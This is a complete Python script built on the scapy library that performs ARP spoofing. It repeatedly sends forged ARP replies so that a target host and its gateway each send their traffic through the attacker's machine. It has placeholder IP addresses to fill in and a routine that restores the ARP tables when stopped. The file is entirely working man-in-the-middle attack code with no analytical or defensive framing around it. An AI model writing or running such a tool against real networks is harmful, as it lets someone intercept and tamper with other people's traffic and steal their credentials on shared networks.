from scapy.all import ARP, Ether, send, srp
import time
import sys

def get_mac(ip):
    # ARP request is sent in broadcast to get the MAC address
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # Create an ARP response, op=2 indicates an ARP reply
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_response, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    arp_response = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(arp_response, count=4, verbose=False)

target_ip = "192.168.1.10"  # Replace with the target IP
gateway_ip = "192.168.1.1"  # Replace with your router/gateway IP

try:
    print("[*] Starting ARP spoofing...")
    while True:
        spoof(target_ip, gateway_ip)  # Spoof target, making it believe you're the router
        spoof(gateway_ip, target_ip)  # Spoof router, making it believe you're the target
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Restoring network, please wait...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[*] ARP Spoofing stopped.")
